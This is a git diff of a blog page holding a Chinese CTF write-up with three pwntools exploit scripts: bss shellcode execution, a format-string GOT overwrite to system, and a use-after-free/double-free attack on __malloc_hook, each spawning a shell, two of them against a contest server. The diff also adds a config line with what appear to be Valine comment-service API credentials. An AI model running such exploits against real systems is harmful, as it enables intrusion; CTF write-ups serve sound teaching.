@@ -142,18 +142,6 @@
         </div>
         <div class="bottom">
           <div class="follow">
-            
-            <a href="https://github.com/shixiaohu2206" target="_block">
-              <span class="iconfont icon-github"></span>
-            </a>
-            
-            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
-              <span class="iconfont icon-facebook"></span>
-            </a>
-            
-            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
-              <span class="iconfont icon-instagram"></span>
-            </a>
              
             <a href="/atom.xml" target="_block">
               <span class="iconfont icon-rss"></span>
@@ -175,6 +163,11 @@
           <span>2019/11/29</span>
         </span>
 
+        
+          <span class="item leancloud-visitors" id="/2019/11/29/i春秋-第三季CTF答题赛write-up/" data-flag-title="i春秋-第三季CTF答题赛write up">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
         
 
          
@@ -212,13 +205,121 @@
     </div>
     <p>福利赛 题目还是比较友好的</p>
 <h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="Electrical-System">Electrical System<a class="post-anchor" href="#Electrical-System"></a></h2><p>bss 段有可执行权限，写一段shellcode，控制程序跳转即可</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process("./Electrical System")</span></span><br><span class="line">p = remote(<span class="string">"120.55.43.255"</span>,<span class="number">11002</span>)</span><br><span class="line">elf=ELF(<span class="string">"./Electrical System"</span>)</span><br><span class="line"></span><br><span class="line">shellcode =<span class="string">"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"</span></span><br><span class="line">p.sendlineafter(<span class="string">"enter your electric card 's ID:\n"</span>,shellcode)</span><br><span class="line">payload = <span class="string">"Recharge"</span>+p8(<span class="number">0</span>)+<span class="string">"a"</span>*<span class="number">7</span></span><br><span class="line"><span class="comment"># payload = "Check"+p8(0)+"a"*10</span></span><br><span class="line">payload += p64(<span class="number">0x00000000006020E0</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Please enter your choice:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+context.log_level=<span class="hljs-string">'debug'</span>
+<span class="hljs-comment">#p = process("./Electrical System")</span>
+p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11002</span>)
+elf=ELF(<span class="hljs-string">"./Electrical System"</span>)
+
+shellcode =<span class="hljs-string">"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"</span>
+p.sendlineafter(<span class="hljs-string">"enter your electric card 's ID:\n"</span>,shellcode)
+payload = <span class="hljs-string">"Recharge"</span>+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">7</span>
+<span class="hljs-comment"># payload = "Check"+p8(0)+"a"*10</span>
+payload += p64(<span class="hljs-number">0x00000000006020E0</span>)
+
+p.sendlineafter(<span class="hljs-string">"Please enter your choice:\n"</span>,payload)
+
+p.interactive()</code></pre>
 
 <h2 id="Car-Search-System">Car Search System<a class="post-anchor" href="#Car-Search-System"></a></h2><p>格式化字符串，首先leak libc，然后修改0xff为0x66，直接修改栈上的值，程序会down掉，所以可以通过指针v8来修改<br>最后修改puts@got为system。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># p = process("./pwn")</span></span><br><span class="line">p = remote(<span class="string">"120.55.43.255"</span>,<span class="number">11001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">lib = ELF(<span class="string">"./libc6-i386_2.23-0ubuntu10_amd64.so"</span>)</span><br><span class="line">offset = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"leave\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%59$p"</span>)</span><br><span class="line">__libc_start_main = int(p.recvline().strip(<span class="string">"\n"</span>),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line"><span class="keyword">print</span> hex(__libc_start_main)</span><br><span class="line">libc = __libc_start_main - lib.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">log.success(<span class="string">"libc base addr : 0x%x"</span>%libc)</span><br><span class="line">system = libc+lib.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"onegadget addr : 0x%x"</span>%system)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"leave\n"</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">30</span>,&#123;elf.got[<span class="string">"puts"</span>]:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"leave\n"</span>)</span><br><span class="line">payload = <span class="string">"%51$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">point = int(p.recvline().strip(<span class="string">"\n"</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"pointer addr : 0x%x"</span>%point)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"leave\n"</span>)</span><br><span class="line">payload = p32(point)+<span class="string">"%98c%30$hhn"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"ar in 7 day"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+<span class="hljs-comment"># context.log_level = 'debug'</span>
+<span class="hljs-comment"># p = process("./pwn")</span>
+p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11001</span>)
+elf=ELF(<span class="hljs-string">"./pwn"</span>)
+lib = ELF(<span class="hljs-string">"./libc6-i386_2.23-0ubuntu10_amd64.so"</span>)
+offset = <span class="hljs-number">30</span>
+
+
+p.recvuntil(<span class="hljs-string">"leave\n"</span>)
+p.sendline(<span class="hljs-string">"%59$p"</span>)
+__libc_start_main = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-247</span>
+<span class="hljs-keyword">print</span> hex(__libc_start_main)
+libc = __libc_start_main - lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]
+log.success(<span class="hljs-string">"libc base addr : 0x%x"</span>%libc)
+system = libc+lib.symbols[<span class="hljs-string">'system'</span>]
+log.success(<span class="hljs-string">"onegadget addr : 0x%x"</span>%system)
+
+p.recvuntil(<span class="hljs-string">"leave\n"</span>)
+payload = fmtstr_payload(<span class="hljs-number">30</span>,&#123;elf.got[<span class="hljs-string">"puts"</span>]:system&#125;)
+p.sendline(payload)
+
+
+p.recvuntil(<span class="hljs-string">"leave\n"</span>)
+payload = <span class="hljs-string">"%51$p"</span>
+p.sendline(payload)
+point = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)
+log.success(<span class="hljs-string">"pointer addr : 0x%x"</span>%point)
+
+
+p.recvuntil(<span class="hljs-string">"leave\n"</span>)
+payload = p32(point)+<span class="hljs-string">"%98c%30$hhn"</span>
+p.sendline(payload)
+
+
+
+p.sendlineafter(<span class="hljs-string">"ar in 7 day"</span>,<span class="hljs-string">"/bin/sh\x00"</span>)
+<span class="hljs-comment"># gdb.attach(p)</span>
+p.interactive()</code></pre>
 
 <h2 id="geek-notes">geek notes<a class="post-anchor" href="#geek-notes"></a></h2><p>UAF</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="comment"># ___Author___ : "pumpkin9"</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>])</span><br><span class="line">p =process(<span class="string">"./geek notes"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(length,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">0x100</span>,<span class="string">""</span>) <span class="comment"># 0</span></span><br><span class="line">addnote(<span class="number">0x100</span>,<span class="string">""</span>) <span class="comment"># 1</span></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-3951480</span></span><br><span class="line">log.success(<span class="string">"libc addr : 0x%x"</span>%libc_base)</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">"malloc_hook:0x%x"</span>%malloc_hook)</span><br><span class="line">log.success(<span class="string">"one_gadget:0x%x"</span>%(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">addnote(<span class="number">0x100</span>,<span class="string">"aaaaaaaa"</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">0x68</span>,<span class="string">"aaaaaaaa"</span>) <span class="comment"># 3</span></span><br><span class="line">addnote(<span class="number">0x68</span>,<span class="string">"bbbbbbbb"</span>) <span class="comment"># 4</span></span><br><span class="line">delnote(<span class="number">3</span>)</span><br><span class="line">delnote(<span class="number">4</span>)</span><br><span class="line">delnote(<span class="number">3</span>)</span><br><span class="line">addnote(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">addnote(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">addnote(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">addnote(<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Note size :"</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span>
+<span class="hljs-comment"># encoding:utf-8</span>
+<span class="hljs-comment"># ___Author___ : "pumpkin9"</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context(terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>])
+p =process(<span class="hljs-string">"./geek notes"</span>)
+libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span><span class="hljs-params">(length,content)</span>:</span>
+	p.recvuntil(<span class="hljs-string">"Your choice :"</span>)
+	p.sendline(<span class="hljs-string">"1"</span>)
+
+	p.recvuntil(<span class="hljs-string">"Note size :"</span>)
+	p.sendline(str(length))
+
+	p.recvuntil(<span class="hljs-string">"Content :"</span>)
+	p.sendline(content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span><span class="hljs-params">(index)</span>:</span>
+	p.recvuntil(<span class="hljs-string">"Your choice :"</span>)
+	p.sendline(<span class="hljs-string">"2"</span>)
+	p.recvuntil(<span class="hljs-string">"Index :"</span>)
+	p.sendline(str(index))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span><span class="hljs-params">(idx)</span>:</span>
+	p.recvuntil(<span class="hljs-string">":"</span>)
+	p.sendline(<span class="hljs-string">"3"</span>)
+	p.recvuntil(<span class="hljs-string">":"</span>)
+	p.sendline(str(idx))
+
+addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 0</span>
+addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 1</span>
+delnote(<span class="hljs-number">0</span>)
+printnote(<span class="hljs-number">0</span>)
+libc_base = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\x00\x00'</span>)<span class="hljs-number">-3951480</span>
+log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc_base)
+malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]
+log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)
+log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))
+addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 2</span>
+
+
+addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 3</span>
+addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"bbbbbbbb"</span>) <span class="hljs-comment"># 4</span>
+delnote(<span class="hljs-number">3</span>)
+delnote(<span class="hljs-number">4</span>)
+delnote(<span class="hljs-number">3</span>)
+addnote(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))
+addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
+addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)
+addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))
+p.sendlineafter(<span class="hljs-string">"Your choice :"</span>,str(<span class="hljs-number">1</span>))
+p.sendlineafter(<span class="hljs-string">"Note size :"</span>,str(<span class="hljs-number">10</span>))
+
+<span class="hljs-comment"># gdb.attach(p)</span>
+p.interactive()</code></pre>
 
 <h1 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h1><h2 id="integer-seq">integer_seq<a class="post-anchor" href="#integer-seq"></a></h2>
 
@@ -245,6 +346,8 @@
   
   <div class="post-guide">
     <div class="item left">
+        
+          <a href="/2019/12/09/SWPUCTF-2019-write-up-md/">SWPUCTF 2019 write up</a>
         
     </div>
     <div class="item right">
@@ -287,7 +390,7 @@
   
 </html>
 <script type="text/javascript">
-                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"vVaPNFdcK9dSGbIzRRK8Lynz-gzGzoHsz\",\"API_KEY\":\"dPlqFhVLg4CTqpRKmq7I0cQw\"},\"service_worker\":{\"open\":false}}")
                 </script> <script type="text/javascript">window.addEventListener('load', function() {
     
     window.loadJs = function(d, m, a) {
